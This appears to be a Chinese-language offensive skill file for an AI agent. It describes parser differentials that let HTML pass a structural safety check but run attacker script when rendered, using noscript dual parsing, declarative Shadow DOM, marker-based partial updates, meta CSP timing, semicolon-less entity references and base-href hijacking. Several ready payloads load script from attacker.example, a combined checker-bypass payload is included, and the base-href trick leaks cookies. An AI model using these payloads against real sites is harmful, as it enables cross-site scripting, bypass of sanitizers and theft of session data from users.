# HTML 双态解析差异 — 同一份输入在"结构检查"与"真实渲染"下表现不同

> 目标系统把同一份 HTML 先按结构检查、后按真实页面渲染时，可构造"检查通过、渲染执行"的条件式 payload。触发词：noscript 双态解析、shadowrootmode、声明式 Shadow DOM、DPU、marker、template for、meta CSP 生效时刻、检查器绕过。

---

## 1. 触发条件（什么时候用这条）

- 目标对同一份 HTML 输入做两次读取：一次用脚本枚举结构判定安全性（元素计数、子节点、属性、textContent），一次作为真实页面渲染执行；
- 检查实现里出现 `childElementCount`、`children`、`textContent`、`querySelectorAll(...).length`、`head.querySelector('meta[http-equiv="content-security-policy"]')` 这类结构断言；
- 需要让一份 payload 同时满足"检查态无害"与"渲染态执行"。

## 2. 六种机制

### 2.1 noscript 双态解析

`<noscript>` 的内容随 scripting 状态走两条解析路径：

- **JS 开启**：内容按原始文本处理，解析器不做标签解析，只查找结束标记 `</noscript>`；
- **JS 关闭**：内容按标记正常解析。

利用点：把 `</noscript>` 放进某个属性的引号里，令开启态提前闭合 noscript，使原本"藏在属性值里"的标签在开启态成为真实元素。

```html
<noscript><a alt="</noscript><script src=//attacker.example/s.js></script>">x</a></noscript>
```

- JS 关：`<script>` 位于 `alt` 属性值中，不是元素，不加载；
- JS 开：第一个 `</noscript>` 结束 noscript，`<script>` 成为真实元素并加载执行。

### 2.2 声明式 Shadow DOM

`<template shadowrootmode="open">` 由解析器直接消费（Chrome 90 起引入，111/124 逐步完善）：内容进入宿主元素的影子树，template 本身不留在普通树。

- 结构检查：`children` / `childElementCount` / `textContent` 等不遍历影子树，看不到内容；
- 真实渲染：影子树照常生效，其中脚本照常执行。

### 2.3 DPU（Declarative Partial Updates，声明式部分更新）

`<?marker name="x">` 标记一个目标位置（DPU 自 Chrome 150 起支持）；`<template for="x">` 的内容在解析到该模板时被搬移进标记处，而不是停留在文档流原处。该搬移是解析器行为，脚本关闭时同样生效。

### 2.4 meta CSP 的生效时刻

`<meta http-equiv="content-security-policy">` 只在其被解析到时生效：文档中位于它之前的脚本不受约束。与 DPU 组合可实现：检查态在 head 里看到 CSP meta（满足"必须带 CSP"类断言），渲染态脚本先执行、meta 后生效。

### 2.5 服务端实体解码器 vs 浏览器字符引用消费

同一份含字符引用的输入，服务端解码与浏览器解析遵循不同规则——服务端解码器常见实现只认**以 `;` 结尾**的引用（如 `/&(#x[0-9a-f]+|#[0-9]+|[a-z]+);/gi`），而 HTML 规范允许浏览器消费**无分号的数字引用**（`&#105` → `i`，缺省分号按历史行为解析成功）。于是 `w&#105dget` 服务端原样保留、浏览器解析出 `widget`——黑名单词（id/name/href 属性值; **标签名不适用**——tokenizer 的标签名状态不解码字符引用，两侧都保持字面）只在浏览器侧复活。

**检查方法**：读服务端解码正则确认分号是否必选；对无分号形式用无头浏览器验证实际解析值（`document.querySelector` 按解码后 id 查找命中即成立）。**利用形态**：绕过存储型内容黑名单构造 DOM clobbering 锚点（`<a id=w&#105dget name=m&#111de href=x>` N 个重复 id 的 name 属性经 HTMLCollection 命名属性当配置对象，见 `$AGENT_DIR/knowledge-base/xss-advanced.md` §5）。

### 2.6 `<base>` 使属性校验与 URL 使用分离

脚本校验读原始值（`getAttribute('href')` + `startsWith('/admin/')` 过检），导航用解析值——`<a>` 元素的 `href` IDL 属性取值时按 `document.baseURI` 解析成绝对 URL 字符串，而 `<base>` 元素正是改变 `document.baseURI` 的手段。注入 `<base href=//attacker/>` 后 raw href 仍是 `/admin/...` 前缀（过检），IDL 解析值却成为攻击者域绝对 URL（下游 `new URL(next.href)` 收到的是这个已被改源的绝对串）——cookie 参数随导航外带。双表征（原始属性 vs 解析 URL）消费不一致即信任边界失效，审计两处读法必须同源。

## 3. 条件式 payload 构造

构造原则：

1. 检查态满足目标全部结构断言（元素计数、必需标签、CSP meta 存在等）；
2. 渲染态执行攻击者脚本；
3. 差异只依赖解析规则，不依赖外部状态，保证可复现。

组合配方：noscript 双态（藏脚本）+ DSD（藏内容与计数）+ DPU（补交 meta、控制生效时刻）。完整组合示例：

```html
<!doctype html><head><?marker name="c"></head><div><template shadowrootmode=open><noscript><a alt="</noscript></template><script src=//attacker.example/s.js></script>">x</a></noscript></template></div><template for=c><meta content="default-src 'none'"http-equiv=content-security-policy></template>
```

- 检查态（JS 关）：head 有 1 个 meta（由 DPU 搬入）、body 只有空 div、无 script 元素；
- 渲染态（JS 开）：`<script src=...>` 为真实元素并解析阻塞加载执行；meta 在文档末尾才被搬进 head，执行时还未生效。

## 4. 检查方法（双态对比）

1. **检查视角**：无头浏览器关 JS（`page.setJavaScriptEnabled(false)`，必要时同时离线 `page.setOfflineMode(true)`）后 `page.setContent(输入)`，枚举 `document.querySelectorAll('*').length`、`head`/`body` 子树、`textContent`、meta 存在性，记录结构；
2. **渲染视角**：同一份输入按真实页面加载（或开 JS `setContent`），观察脚本是否执行（如外联请求是否到达）与执行时刻的 CSP 状态；
3. **判据**：检查视角判"干净"、渲染视角出现执行/请求，则双态差异成立；
4. 两次实验必须使用同一份字节的输入（不要分别为两次实验改写输入）。

## 5. 边界

- 机制有版本门槛：声明式 Shadow DOM 自 Chrome 90 起引入（111/124 逐步完善）、DPU 自 Chrome 150 起支持；使用前先确认目标浏览器支持（起一个最小页面验证，不要只凭版本号判断）；
- 解析行为存在版本差异，跨版本复用先复跑；
- 目标响应头自带 CSP 时，另按该 CSP 的指令集评估（本条只解决 meta CSP 的时序与结构断言）；
- 与 `$AGENT_DIR/knowledge-base/xss-advanced.md` 的 noscript 解析差异条互补：那条用于构造注入触发，本条用于同时通过结构检查；
- 未测清单：非 Chromium 内核行为、DSD 与 DPU 组合的最低版本、纯 CSS 结构断言下的表现。
